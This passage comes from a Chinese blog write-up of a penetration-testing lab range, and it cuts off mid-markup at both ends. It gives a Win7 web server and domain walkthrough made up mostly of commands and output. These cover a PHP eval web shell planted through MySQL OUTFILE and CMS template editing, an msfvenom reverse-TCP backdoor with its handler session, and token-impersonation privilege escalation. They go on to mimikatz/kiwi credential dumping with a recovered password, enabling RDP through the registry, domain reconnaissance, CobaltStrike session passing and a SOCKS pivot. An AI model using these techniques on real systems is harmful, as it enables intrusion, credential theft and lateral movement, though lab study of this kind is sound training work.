study探针"></p><p>注意到最下方有个MySQL数据库的连接检测，简单测试了一下，是可以用弱口令进行爆破的，但是这个口令实在是太弱了，也没必要再上BurpSuite了。<code>用户名/root        密码/root</code></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605005633874.png" alt="弱口令爆破处"></p><p>登录之后是英文的，把语言换成中文(Simplified)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605084538186.png" alt="/其他信息"></p><p>本来是想直接利用mysql写入shell的，但是好像是模式不对，不能写入文件。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">创建数据表导出shell，写shell到目标主机CREATE TABLE &#96;mysql&#96;.&#96;user1&#96; (&#96;content&#96; TEXT NOT NULL );INSERT INTO &#96;mysql&#96;.&#96;user1&#96; (&#96;content&#96; ) VALUES (&#39;&lt;?php @eval($_POST[x123]);?&gt;&#39;);SELECT &#96;content&#96; FROM &#96;user1&#96; INTO OUTFILE &#39;C:\\phpStudy\\WWW\\xxx.php&#39;;DROP TABLE IF EXISTS &#96;user1&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605113426399.png" alt="禁止写文件"></p><p><strong>注意到还有个网站的数据库</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605113549994.png" alt="image-20210605113549994"></p><h4 id="4-后台Getshell上传技巧"><a href="#4-后台Getshell上传技巧" class="headerlink" title="4.后台Getshell上传技巧"></a>4.后台Getshell上传技巧</h4><p>经典，太经典了啊</p><p><a href="https://blog.csdn.net/LK20191121/article/details/103181514">YXcms getshell</a></p><p>这里采用的是文件上传</p><p><strong>先通过刚才的数据库信息获得该站的管理员账号密码</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114122717.png" alt="看一下管理员的账号密码"></p><pre class="line-numbers language-none"><code class="language-none">admin&#x2F;168a73655bfecefdb15b14984dd2ad60admin&#x2F;949ba59abbe56e05<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114222423.png" alt="将管理员的密码解一下md5"></p><p>登录网站管理员</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605114419482.png" alt></p><p>登不上，我人傻了，我这里有两处错误，</p><ol><li>首先是密码不是刚才解得的，还有一层hash应该是，但是我不知道怎么解，这里可以直接使用YXcms的弱口令来登入管理员，</li><li>其次就是我这个路径不对，这是一般账号登入的地方，管理员应该把member换为admin来登入即可。</li></ol><p>前台模板处可以getshell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605115353980.png" alt></p><p>这里直接新建一个<code>eval.php</code>文件，内容写为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"m4xlmum"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605120306642.png" alt></p><p>这里我没有找到前台文件的路径，但是考虑到可以使用<code>../</code>来进行目录穿越直接将文件写入站点的根目录，进根目录发现确实已经写入了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605120551436.png" alt="没有出现404 not found就是已经把shell写入了"></p><p>使用蚁剑连接shell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605122429678.png" alt></p><h4 id="5-系统信息收集"><a href="#5-系统信息收集" class="headerlink" title="5.系统信息收集"></a>5.系统信息收集</h4><pre class="line-numbers language-none"><code class="language-none">(*) 基础信息当前路径: C:&#x2F;phpStudy&#x2F;WWW磁盘列表: C:D:系统信息: Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586当前用户: Administrator(*) 输入 ashelp 查看本地命令C:\phpStudy\WWW&gt; cd C:&#x2F;phpStudy&#x2F;WWW&#x2F;C:\phpStudy\WWW&gt; whoamigod\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>连接远程桌面(rdesktop)</strong></p><p>蚁剑开一下终端，发现是域用户administrator账号的权限。这时这台主机的权限几乎就全拿到了，然后就是开一下端口方便我们进行远程连接</p><pre class="line-numbers language-none"><code class="language-none"># 开windows 3389端口的命令REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# 关windows 3389端口的命令REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下面就是<strong>连接windows远程桌面的命令</strong></p><pre class="line-numbers language-none"><code class="language-none">kali连接rdp远程桌面**命令**rdesktop -g 1440x900 -r disk:LinuxDisk&#x3D;&#x2F;root&#x2F;Downloads -u administrator -p &quot;password&quot; 192.168.72.128:3389# 如果无rdesktop工具，可用 sudo apt install rdesktop 命令安装**参数**-g    # 窗口分辨率-r    # 本地目录共享-u    # 用户名-p    # 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-主机密码收集"><a href="#6-主机密码收集" class="headerlink" title="6.主机密码收集"></a>6.主机密码收集</h4><p>上面的这个系统信息没什么好收集的感觉，直接尝试能不能dump出windows主机的用户名/密码。使用msf + mimikatz</p><p>先使用msf制作一个适用于win7的后门程序，这里我直接就使用的是msf自带的payload了，没用CS的payload，一是CS和msf的联动现在还不太会，二是这个系统版本不新，也没有什么好的防御措施(例如360、卡巴斯基等等)，所以不做免杀也该也是能过的。</p><pre class="line-numbers language-none"><code class="language-none"># msf生成适用于win7的后门程序msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.72.130 LPORT&#x3D;4444 -f exe -o ~&#x2F;桌面&#x2F;shell┌──(m4xlmum㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.72.130 LPORT&#x3D;4444 -f exe -o ~&#x2F;桌面&#x2F;shell  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytesSaved as: &#x2F;home&#x2F;m4xlmum&#x2F;桌面&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后缀名加个<code>.exe</code>就行了，生成的时候忘记加了。然后把shell上传到win7里面(使用蚁剑的上传功能)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605134737305.png" alt></p><p>在蚁剑中打开一个终端，切换到这个存在shell的目录下面，使用如下命令执行shell(为保证万无一失，这里先不执行，等kali监听做好了再执行)。</p><pre class="line-numbers language-none"><code class="language-none">start shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>配置攻击机的监听选项</strong></p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit&#x2F;multi&#x2F;handler [*] Using configured payload generic&#x2F;shell_reverse_tcpmsf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(multi&#x2F;handler) &gt; show optionsModule options (exploit&#x2F;multi&#x2F;handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST                      yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.72.130lhost &#x3D;&gt; 192.168.72.130msf6 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.72.130:4444 [*] Sending stage (175174 bytes) to 192.168.72.128[*] Meterpreter session 1 opened (192.168.72.130:4444 -&gt; 192.168.72.128:21682) at 2021-06-05 13:55:48 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我是在run之后再去蚁剑的终端里面start那个后门程序的，这时已经获得了shell的连接了，输入shell获得powershell，然后查看自己的权限。</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; shellProcess 2264 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Program Files&gt;whoamiwhoamigod\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然这里是administrator，但是却并不是SYSTEM权限，这里就需要我们再提一下权限了</p><p><strong>Windows 7 权限提升</strong></p><p>提权参考<a href="https://blog.csdn.net/nzjdsds/article/details/82262830">Windows提权辅助工具使用参考文章</a></p><p>先在蚁剑的shell下生成一个Systeminfo命令的文本文档，命名为<code>win7.txt</code>。</p><pre class="line-numbers language-none"><code class="language-none">Systeminfo &gt; win7.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把这个文件拉到kali里面，然后下载<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p><pre class="line-numbers language-none"><code class="language-none"># 先更新一下数据库┌──(m4xlmum㉿kali)-[~&#x2F;桌面&#x2F;web&#x2F;windows权限提升]└─$ python windows-exploit-suggester.py --update                            1 ⨯[*] initiating winsploit version 3.3...[+] writing to file 2021-06-05-mssb.xls[*] done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后查看可以使用的有针对性的漏洞，但是需要注意的是，使用这个工具需要下载<code>xlrd</code>python库并且版本不能太高，我用的时候报错了，重新安装了<code>pip install xlrd==1.2.0</code>才解决了，并且要使用python2。</p><pre class="line-numbers language-none"><code class="language-none">python windows-exploit-suggester.py --database 2021-06-05-mssb.xls --systeminfo win7.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我截取了一部分存在远程代码执行的漏洞，看看msfdb里面有没有对应的POC，从上向下找。</p><pre class="line-numbers language-none"><code class="language-none">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40039&#x2F;, PoC[*] [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39232&#x2F; -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39233&#x2F; -- Microsoft Office &#x2F; COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC[*] [E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38911&#x2F; -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#39; MCL File, PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38912&#x2F; -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38918&#x2F; -- Microsoft Office &#x2F; COM Object - &#39;els.dll&#39; DLL Planting (MS15-134)[*]   https:&#x2F;&#x2F;code.google.com&#x2F;p&#x2F;google-security-research&#x2F;issues&#x2F;detail?id&#x3D;514 -- Microsoft Office &#x2F; COM Object DLL Planting with els.dll[*] [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38968&#x2F; -- Microsoft Office &#x2F; COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;38918&#x2F; -- Microsoft Office &#x2F; COM Object els.dll DLL Planting (MS15-134), PoC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这次不想用上面的这些漏洞，想试试msfconsole自带的一些漏洞利用工具，这里选择使用<code>post/multi/recon/local_exploit_suggester</code>，使用方法与命令如下:</p><p>漏洞利用 &amp; 权限提升</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.72.130:4444 [*] Sending stage (175174 bytes) to 192.168.72.128[*] Meterpreter session 2 opened (192.168.72.130:4444 -&gt; 192.168.72.128:22785) at 2021-06-05 15:44:09 +0800meterpreter &gt; background[*] Backgrounding session 2...msf6 exploit(multi&#x2F;handler) &gt; sessionsActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  Id  Name  Type                  Information            Connection  --  ----  ----                  -----------            ----------  2         meterpreter x86&#x2F;wind  GOD\Administrator @ S  192.168.72.130:4444 -            ows                   TU1                    &gt; 192.168.72.128:2278                                                         5 (192.168.72.128)msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 2session &#x3D;&gt; 2msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; exploit[*] 192.168.72.128 - Collecting local exploits for x86&#x2F;windows...[*] 192.168.72.128 - 38 exploit checks are being tried...[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlamperei: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_081_track_popup_menu: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ntusermndragover: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec: The target appears to be vulnerable.[+] 192.168.72.128 - exploit&#x2F;windows&#x2F;local&#x2F;tokenmagic: The target appears to be vulnerable.[*] Post module execution completedmsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的所有exploit只试了一个，试了试漏洞<code>ms16_075</code>，但是直接使用msf的poc似乎会出错，参考<a href="https://blog.csdn.net/cj_Allen/article/details/105489922">Metasploit下利用ms16-075提权</a>，在下面这个地方<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">下载该exploit</a></p><p><strong>ms16_075权限提升</strong></p><p>下载好上面的那个potato.exe文件之后，将这个exe文件上传至<code>c:/</code>目录下，然后执行以下命令来提权</p><pre class="line-numbers language-none"><code class="language-none">use incognito                     ：加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)list_tokens -u    ：列出目标主机用户的可用令牌execute -cH -f c:&#x2F;potato.exe       :创建新的进程list_tokens -u :列出目标主机用户的可用令牌impersonate_token &quot;NT AUTHORITY\SYSTEM&quot; :假冒目标主机上的可用令牌# 实际上执行下面这三条命令应该就足够了use incognitoexecute -cH -f c:&#x2F;potato.exeimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605163004946.png" alt="中间错误较多，不复制粘贴了"></p><p><strong>kiwi明文密码抓取</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load kiwi[!] The &quot;kiwi&quot; extension has already been loaded.meterpreter &gt; help kiwiKiwi Commands&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    Command                Description    -------                -----------    creds_all              Retrieve all credentials (parsed)    creds_kerberos         Retrieve Kerberos creds (parsed)    creds_livessp          Retrieve Live SSP creds    creds_msv              Retrieve LM&#x2F;NTLM creds (parsed)    creds_ssp              Retrieve SSP creds    creds_tspkg            Retrieve TsPkg creds (parsed)    creds_wdigest          Retrieve WDigest creds (parsed)    dcsync                 Retrieve user account information via DCSync (unparsed)    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync    golden_ticket_create   Create a golden kerberos ticket    kerberos_ticket_list   List all kerberos tickets (unparsed)    kerberos_ticket_purge  Purge any in-use kerberos tickets    kerberos_ticket_use    Use a kerberos ticket    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)    lsa_dump_sam           Dump LSA SAM (unparsed)    lsa_dump_secrets       Dump LSA secrets (unparsed)    password_change        Change the password&#x2F;hash of a user    wifi_list              List wifi profiles&#x2F;creds for the current user    wifi_list_shared       List shared wifi profiles&#x2F;creds (requires SYSTEM)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里应该是我环境配置的原因，直接就上管理员权限了，先加载msf的模块<code>kiwi</code>，这个模块代替了<code>mimikatz</code>模块，上面的命令为查询kiwi模块的使用方式的命令。</p><p><strong>kiwi_cmd模块，可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令即可</strong></p><p>kiwi专用的命令</p><pre class="line-numbers language-none"><code class="language-none">load kiwicreds_all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>没dump出来，但是直接用mimikatz的话会报错，必须把当前进程迁移到64位进程中去，进程迁移使用以下命令，ps回显太多不复制了。</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; psProcess List&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; PID   PPID  Name               Arch  Session  User                          Path ---   ----  ----               ----  -------  ----                          ---- 0     0     [System Process] 4     0     System             x64   0 252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe 308   612   slui.exe           x64   1        GOD\Administrator             C:\Windows\System32\slui.exe 332   324   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 340   492   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe 384   324   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe 396   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 432   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe 492   384   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exemeterpreter &gt; migrate 332[*] Migrating from 1196 to 2044...[*] Migration completed successfully.meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605165646907.png" alt="image-20210605165646907"></p><p>账户密码获得为</p><pre class="line-numbers language-none"><code class="language-none">administrator&#x2F;@dmin123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>开3389端口</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp[*] Enabling Remote Desktop[*] RDP is already enabled[*] Setting Terminal Services service startup mode[*] Terminal Services service is already set to auto[*] Opening port in local firewall if necessary[*] For cleanup execute Meterpreter resource file: &#x2F;home&#x2F;m4xlmum&#x2F;.msf4&#x2F;loot&#x2F;20210605172936_default_192.168.72.128_host.windows.cle_771977.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605173036618.png" alt></p><p><strong>开远程桌面</strong></p><pre class="line-numbers language-none"><code class="language-none">rdesktop -g 1440x900  192.168.72.128:3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">用户名: GOD\administrator   # 域用户登录，用户民格式为：域名\用户名密  码: @dmin123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605173536027.png" alt></p><p>这个最好是再开一个用户，而且再开一个用户也应该用不到抓administrator的用户密码了，所做的工作就会少很多（主要是学习嘛，也走了许多弯路）。</p><h3 id="三、内网搜集"><a href="#三、内网搜集" class="headerlink" title="三、内网搜集"></a>三、内网搜集</h3><h4 id="7-内网—继续信息收集"><a href="#7-内网—继续信息收集" class="headerlink" title="7.内网—继续信息收集"></a>7.内网—继续信息收集</h4><p>接下来看看其他主机了，这个已经算是拿下了吧，虽然不太完美，下一个争取完美一点。</p><p><strong>配置静态路由</strong></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>内网存活主机扫描</strong></p><p>使用msf自带netbios扫描内网存活机器，发现存活机器还有其他两台，地址分别为<code>192.168.52.138</code>和<code>192.168.52.141</code>，本机为<code>192.168.52.143</code></p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbnamemsf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; set session 1session &#x3D;&gt; 1msf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; set rhosts 192.168.52.0&#x2F;24rhosts &#x3D;&gt; 192.168.52.0&#x2F;24msf6 auxiliary(scanner&#x2F;netbios&#x2F;nbname) &gt; exploit[*] Sending NetBIOS requests to 192.168.52.0-&gt;192.168.52.255 (256 hosts)[+] 192.168.52.138 [OWA] OS:Windows Names:(OWA, GOD) Addresses:(192.168.52.138) Mac:00:0c:29:3f:5d:a9 Virtual Machine:VMWare[+] 192.168.52.141 [ROOT-TVI862UBEH] OS:Windows Names:(ROOT-TVI862UBEH, GOD, __MSBROWSE__) Addresses:(192.168.52.141) Mac:00:0c:29:6d:39:34 Virtual Machine:VMWare[+] 192.168.52.143 [STU1] OS:Windows Names:(STU1, GOD)  Mac:00:0c:29:a7:c1:a8 Virtual Machine:VMWare[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>域内信息收集命令(抄徐神的，爽)</strong></p><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain        #查看时间服务器net user &#x2F;domain        #查看域用户net view &#x2F;domain        #查看有几个域net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员net group &quot;domain controllers&quot; &#x2F;domain       #查看域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h3><h4 id="8-CobaltStrike联动msf"><a href="#8-CobaltStrike联动msf" class="headerlink" title="8.CobaltStrike联动msf"></a>8.CobaltStrike联动msf</h4><p>msf获取到shell后，可以派发给cobaltstrike，首先cobaltstrike创建监听器：</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605193822354.png" alt></p><p>msf执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_httpset DisablePayloadHandler true   #payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成set lhost 192.168.72.130                 #公网vps ipset lport 8888                  #监听端口 set session 1                   #派发session idexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行完所有命令之后将会看到CobaltStrike中有一台主机上线</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605194323631.png" alt></p><p>这里的原理就是，受害者网络反弹了一个shell到msf，msf又给自己生成了一个shell，再将网络送到CS(大概猜测)。</p><h4 id="9-搭建跳板主机"><a href="#9-搭建跳板主机" class="headerlink" title="9.搭建跳板主机"></a>9.搭建跳板主机</h4><p>其实就是将拿到权限的受害者主机(win7 web服务器)作为跳板(代理服务器)来连通内网。</p><p><strong>搭建Socket4a隧道 + proxychains</strong></p><pre class="line-numbers language-none"><code class="language-none">backgrounduse auxiliary&#x2F;server&#x2F;socks_proxyset version 4arunjobs  # 查看任务是否正常执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;proxychains.conf  #配置proxychainssocks4 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是就算是成功搭建跳板主机了，测试一下</p><pre class="line-numbers language-none"><code class="language-none">proxychains curl http:&#x2F;&#x2F;192.168.72.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的是php study探针的内容的话应该就是搭建成功了的。</p><h4 id="10-内网端口扫描"><a href="#10-内网端口扫描" class="headerlink" 